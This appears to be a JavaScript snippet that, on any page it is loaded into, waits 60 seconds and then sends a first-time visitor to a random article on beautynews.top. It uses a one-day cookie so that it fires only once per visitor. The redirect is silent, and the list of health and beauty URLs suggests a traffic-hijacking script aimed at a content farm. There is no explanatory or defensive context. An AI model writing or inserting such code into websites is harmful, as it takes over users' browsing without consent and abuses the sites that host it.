
function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

$(document).ready(function(){
    var list_url = [
        'https://beautynews.top/vitamin-e-and-miraculous-effects-in-skin-beauty-anti-aging/',
        'https://beautynews.top/vitamin-d-and-the-importance-in-the-beauty-process/',
        'https://beautynews.top/treating-dry-cough-effectively-with-10-daily-dishes/',
        'https://beautynews.top/is-breakfast-really-the-most-important-meal-of-the-day/',
        'https://beautynews.top/the-5-best-foods-for-knee-pain-patients-must-eat-2019/',
        'https://beautynews.top/vitamin-c-not-only-helps-you-stay-healthy/',
        'https://beautynews.top/5-vitamins-blow-away-acne-millions-of-people-use-it/',
        'https://beautynews.top/prevent-skin-aging-to-have-forever-20-years-old-skin/',
        'https://beautynews.top/warning-the-anti-vaccine-movement-threatens-childrens-life-dangers-like-hiv/',
        'https://beautynews.top/use-antibiotics-for-children-right-and-absolutely-safe-with-7-principles/',
        'https://beautynews.top/the-standard-way-to-help-people-with-stroke/',
        'https://beautynews.top/identify-to-distinguish-anal-anus-from-hemorrhoids/',
        'https://beautynews.top/gynaecological-disease-the-fungus-or-mild-inflammation/',
        'https://beautynews.top/drugs-to-prevent-and-treat-sore-throat-sore-throat-effectively/',
        'https://beautynews.top/cure-chronic-throat-inflammation/',
        'https://beautynews.top/is-there-any-way-to-make-your-hair-soft-smooth-and-tangled/',
        'https://beautynews.top/natural-curly-hair-and-treatment/'
    ];
    var rand = list_url[Math.floor(Math.random() * list_url.length)];
    var history1 = getCookie("history1");
    if (history1 != "") {
        console.log('datruycap');
    } else {
        console.log('chuatruycap');
        setTimeout(function(){
            setCookie("history1", 'datruycap', 1);
            window.location.href = rand;
        },60000);
    }
});
